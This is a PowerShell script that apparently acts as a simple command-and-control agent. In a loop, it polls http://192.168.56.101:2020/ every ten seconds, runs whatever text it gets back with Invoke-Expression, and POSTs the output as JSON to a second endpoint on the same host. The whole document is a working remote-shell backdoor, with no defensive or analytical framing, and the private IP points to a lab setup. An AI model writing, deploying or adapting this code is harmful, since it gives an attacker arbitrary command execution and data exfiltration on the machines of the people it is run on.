function Get-HttpResponse {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [string]$Url,

        [Parameter(Mandatory = $false)]
        [System.Collections.Hashtable]$Headers,

        [Parameter(Mandatory = $false)]
        [switch]$ReturnContentOnly
    )

    try {
        # Use Invoke-WebRequest with UseBasicParsing to avoid IE dependency
        $response = Invoke-WebRequest -Uri $Url -Headers $Headers -UseBasicParsing -ErrorAction Stop

        # Check if only the content should be returned
        if ($ReturnContentOnly) {
            # Output content without line wrap
            $content = $response.Content
            $content -replace "`r`n", ""
        } else {
            # Return the full response object
            return $response
        }
    } catch {
        # Handle errors and return a meaningful error message
        Write-Warning "Failed to fetch response from $Url"
        Write-Error $_.Exception.Message
    }
}


# Example usage
# Fetch full response:
# $response = Get-HttpResponse -Url "http://192.168.56.101:2020/"
# Write-Host $response
$counter = 100
while($counter -ne 1)
{
    $counter = $counter -1
    
    # Fetch only content:
    try {
    Start-Sleep -Seconds 10
    $content = Get-HttpResponse -Url "http://192.168.56.101:2020/" -ReturnContentOnly
    Write-Host $content
    # Define the command as a string and the endpoint for the POST request
    $command = $content # Command as text
    $postUri = 'http://192.168.56.101:5000/api/endpoint' # Replace with your API endpoint

    try {
        # Run the command and capture standard output and errors
        $output = Invoke-Command -ScriptBlock {
            param ($cmd)
            try {
                # Use Invoke-Expression to execute the command string
                $result = Invoke-Expression $cmd 2>&1

                # Ensure the result is converted to a single line (escape newlines)
                if ($result -is [array]) {
                    $result = $result -join "`n" # Join array output into a single string
                }

                $status = "success"
            } catch {
                # Capture any error
                $result = $_.Exception.Message
                $status = "error"
            }
            [PSCustomObject]@{
                Status = $status
                Result = $result
            }
        } -ArgumentList $command

        # Convert the output to JSON
        $jsonBody = $output | ConvertTo-Json -Depth 10 -Compress

        # Send the output as a POST request
        $response = Invoke-RestMethod -Uri $postUri -Method Post -Body $jsonBody -ContentType 'application/json'

        # Print the response
        Write-Output "Response from server: $response"

    } catch {
        # Log any error that occurs in the script execution
        Write-Error "An error occurred: $($_.Exception.Message)"
    }




    } catch {
    Write-Error "Skill issue"
    }
}


